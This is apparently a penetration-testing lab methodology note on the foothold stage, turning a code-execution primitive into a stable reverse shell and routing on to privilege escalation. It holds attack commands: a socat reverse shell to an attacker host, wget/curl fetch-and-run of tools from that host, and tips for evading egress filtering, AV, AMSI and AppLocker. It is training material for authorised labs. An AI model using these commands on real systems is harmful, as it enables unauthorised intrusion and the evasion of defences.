# Foothold

You have a way to run code or write a file on the target. This note turns that primitive into a **stable, understood shell** and hands you off to privilege escalation. It is the bridge between "enumeration found a way in" and "I am working on the box".

## Goal
Convert a confirmed execution/write primitive into a stable interactive shell on the correct interface, confirm who and where you are, then route to the right privesc note — without guessing at payloads.

## Three states — never conflate them
```text
1. CODE EXECUTED      one command ran once (a ping, an id, an echo). Proves the bug, not access.
2. STABLE SHELL       an interactive session you can navigate, tab-complete, and survive Ctrl-C in.
3. PRIVILEGED IDENTITY the shell's whoami is already root / SYSTEM (a web/DB/mail RCE often is).
```
Check state 3 early, but keep it separate from state 2 — **privilege and interaction quality are independent.** A service-borne RCE (IIS, MSSQL, a mail daemon) may already run as SYSTEM/root, which lets you skip the *privilege-escalation* phase. It does **not** mean you have a stable shell: a privileged **one-shot** primitive (`xp_cmdshell`, a single web-RCE call) is still one-shot. If you need to work interactively, stabilise it (Step 5) regardless of privilege; if a one-shot privileged call already yields the proof you need, take it.

## Open this when
- A web pass confirmed RCE, upload, or file write → routed here from [[00_WEB_METHODOLOGY]] / [[file_upload]] / [[injection]] / [[lfi_rfi]] / [[auth_bypass]]
- A service/credential path gave command execution (SNMP argv, MSSQL `xp_cmdshell`, a cron/systemd write, redis, etc.)
- You have valid creds for an interactive/remote-management service → jump straight to the authenticated route below

---

# Step 1 — Identify the execution primitive

Your next move is decided by *what you actually control*, not by the vulnerability's name.

| Primitive you hold | Cheapest route to a shell | Notes |
|---|---|---|
| **Command execution** (RCE, cmd injection, `xp_cmdshell`, argv) | reverse shell one-liner, or run a downloaded implant | test it runs *at all* first (`id`/`whoami`) |
| **Web shell / file write into webroot** | drop a minimal webshell, then upgrade to reverse | prefer upgrading — webshells are fragile & stateless |
| **Arbitrary file write (non-web)** | write an SSH key, a cron/systemd job, a service binary | this is often already a privesc, not just a foothold |
| **Interactive desktop** (RDP/VNC/X) | you already have a session — open a terminal | [[3389_rdp]] · [[5900_vnc]] |
| **Authenticated remote management** (WinRM/SSH) | log in directly, no payload needed | [[5985_winrm]] · [[22_ssh]] |

> [!tip] Cheapest test before any payload
> Run one command that echoes a unique string (`echo GRAIL$$`, `id`, `whoami`, `hostname`). If that round-trips, the primitive works and you only have to solve *delivery of a shell*. If it does not, you are debugging the primitive, not the payload — go back to the web/service note.

---

# Step 2 — Choose the callback shape

Decide **bind vs reverse**, then **payload runtime**, then **interface**.

### Bind vs reverse
- **Reverse** (target connects to you) is the default — most targets can reach out even when nothing can reach in.
- **Bind** (you connect to a port the target opens) only when the target has no egress but you can reach a fresh port on it (rare; usually blocked by host firewall).

### Payload runtime — pick what the target already has
Match the payload to the confirmed OS, architecture, and an available interpreter/execution context. Do **not** upload a binary when a one-liner in an already-present interpreter works.

```text
Linux  : bash tcp, or an available interpreter (python/perl/nc). Confirm which exist.
Windows: PowerShell reverse one-liner, or a generated binary matched to HOST arch (see WOW64 trap).
Both   : msfvenom-generated binary only when a native one-liner is blocked or absent.
```
- **Architecture:** a 32-bit payload on 64-bit Windows can still work, but a 64-bit payload on a 32-bit host will not. Confirm the *host* arch, not the shell's — the WOW64 trap and the check are in [[01_orientation]].
- **Egress:** if arbitrary outbound is filtered, bind your listener to **80/443** — these survive most egress rules.

### Interface / routing — the most common silent failure
Your `<LHOST>` must be the address the *target* can route back to.
```bash
ip -brief addr        # which of tun0 / eth0 / a NAT iface is on the target's network?
```
- Call the interface on the target's network `<iface>` and its address `<LHOST>` — reuse both in the listener/verify steps below.
- Lab VPN (OffSec/HTB/PG): `<iface>` is almost always your **`tun0`**, not `eth0`.
- After a pivot, the callback must reach you *through the pivot* — `<iface>`/`<LHOST>` become the pivot-facing values → see [[pivoting_and_tunnelling]].

---

# Step 3 — Start and verify the listener

```bash
# on Kali — plain catcher (also fine for a first shell)
nc -lvnp <LPORT>
# or the resilient multi-handler you can upgrade later
rlwrap nc -lvnp <LPORT>
```
Verify the listener is actually bound and reachable **before** firing the payload:
```bash
ss -lntp | grep <LPORT>        # is it listening?
sudo tcpdump -ni <iface> port <LPORT>   # <iface> = the interface identified in Step 2; do the target's SYN packets arrive?
```
`tcpdump` is the tie-breaker: a SYN arriving but no shell = payload/runtime problem; **no SYN** = routing/interface/egress problem (wrong `<LHOST>`, wrong interface, or blocked egress).

---

# Step 4 — Fire, then confirm the three states

Fire the reverse shell from the primitive. The instant it connects:

```bash
id ; whoami ; hostname ; uname -a          # Linux — identity, host, kernel
```
```powershell
whoami ; hostname ; whoami /priv ; whoami /groups   # Windows — see 01_orientation
```
Ask immediately:
- **Who am I?** root/SYSTEM → you can skip the *privilege-escalation* phase; you may still need to stabilise this shell (Step 5) before relying on it. Collect proof and re-enumerate as this identity.
- **Where am I?** hostname/role hint; record it.
- **What can reach me / what can I reach?** interfaces, routes, local listeners (Step 6).

---

# Step 5 — Stabilise the shell

A raw reverse shell has no job control, no tab-completion, no `sudo`, and dies on Ctrl-C. Stabilise it before you trust that a technique "failed".

### Linux — full PTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
export TERM=xterm
# then background with Ctrl-Z and, on Kali:
stty raw -echo; fg
# press Enter twice; now arrows, tab, Ctrl-C, and sudo work
```
Fallbacks when no python: `script -qc /bin/bash /dev/null`, or an `expect`/`socat` PTY (`socat file:$(tty),raw,echo=0 tcp-listen:<LPORT>` on Kali ⇄ `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KALI_IP>:<LPORT>` on target).

### Windows
- A cmd/PowerShell reverse shell is usually "good enough"; don't over-invest.
- For a fully interactive TTY, prefer a proper remote-management session: `evil-winrm` ([[5985_winrm]]) or RDP ([[3389_rdp]]) once you have creds.
- `ConPtyShell` gives an upgraded PTY when you need one; treat it as optional.

> [!warning] If interactive commands misbehave, stabilise before concluding
> `sudo`, `su`, ssh, screen editors, and interactive installers all break in an un-stabilised shell. A technique that "does nothing" often just needs a PTY. (This is the recurring [[99_STUCK_RESET]] "Interactive shells" lesson.)

---

# Step 6 — Immediate post-shell checks

Before privesc tooling, take a 30-second baseline — it decides your route and feeds the pivot notes.

```bash
# Linux
id ; sudo -l 2>/dev/null ; hostname ; uname -a
ip -brief addr ; ip route            # extra interfaces = a second network to pivot into
ss -lntup                            # local-only listeners = internal services -> internal_port_enum
```
```powershell
# Windows
whoami /all
ipconfig /all ; route print          # extra interfaces = pivot surface
netstat -ano | findstr LISTENING     # 127.0.0.1 listeners -> internal_port_enum
```
Route the findings:
- Loopback-only / internal listeners → [[internal_port_enum]]
- A second NIC / another subnet → [[pivoting_and_tunnelling]]
- App configs, keys, archives, history → [[artifact_triage]] · [[08_interesting_files]] (Linux) · [[05_stored_credentials]] (Windows)
- Not privileged yet → Linux [[00 master checklist]] · Windows [[00_master_checklist]]

---

# File transfer (Kali → target)

Serve on Kali, pull on the target, **verify size + hash**, then run. A successful download does **not** prove execution — AV, arch, runtime, or ACLs can still block the run.

```bash
# on Kali
python3 -m http.server 80                        # HTTP (80/443 survive egress filtering)
impacket-smbserver share "$(pwd)" -smb2support   # SMB fallback when HTTP is blocked
```
```bash
# on a Linux target
wget http://<KALI_IP>/<tool> -O /tmp/<tool>; chmod +x /tmp/<tool>
curl http://<KALI_IP>/<tool> -o /tmp/<tool>
sha256sum /tmp/<tool>                             # compare to Kali's sha256sum
```
- **Windows transfer, destinations, hashing, and the failure-order checklist** already live in [[01_orientation#File transfer - Kali to Windows|file transfer]] — use that, don't duplicate it.

---

# Failure routing

| Symptom | Likely cause | Next action |
|---|---|---|
| No SYN in `tcpdump` | wrong `<LHOST>`/interface, or egress blocked | use the `tun0`/pivot address; move listener to 80/443 |
| SYN arrives, no shell | payload runtime absent or wrong | switch interpreter; match payload to confirmed arch |
| Shell connects then dies instantly | non-interactive prompt, or one-shot exec context | stabilise (Step 5); relaunch from a persistent context |
| Binary downloads then vanishes | AV / Defender quarantine | use a less-flagged tool, a native one-liner, or a LOLBAS |
| `sudo`/`su`/editor "hangs" | un-stabilised shell | do Step 5 first, then retry |
| Reverse shell impossible (no egress) | strict outbound filtering | try bind shell, or webshell + [[internal_port_enum]] |
| Windows one-liner blocked | AppLocker / execution policy / AMSI | run from an allowed dir, `-ep bypass`, LOLBAS ([[01_orientation]]) |

If two routes fail with no new evidence → [[99_STUCK_RESET]].

---

# Authenticated route (you already have valid creds)
No payload needed — log in through a real service and you get a stable shell for free:
- Windows: [[5985_winrm]] (`evil-winrm`) · [[3389_rdp]] · SMB exec ([[smb_attacks]])
- Linux: [[22_ssh]]

Then re-run Step 6 as the new identity — new creds mean re-enumerate from scratch.

---

# Cleanup & evidence (authorised labs)
- Record every file you dropped (webshells, binaries, keys, cron/service edits) and its path.
- Remove artifacts you no longer need; note any you must leave to keep access.
- Capture the proof the exam/report needs (`whoami`, `hostname`, the flag path) as you go, not later.

> [!important] Helpline
> Primitive before payload. Interface before listener. Listener verified before firing. Stabilise before judging. **Code executed ≠ stable shell ≠ privileged identity** — say which one you actually have.
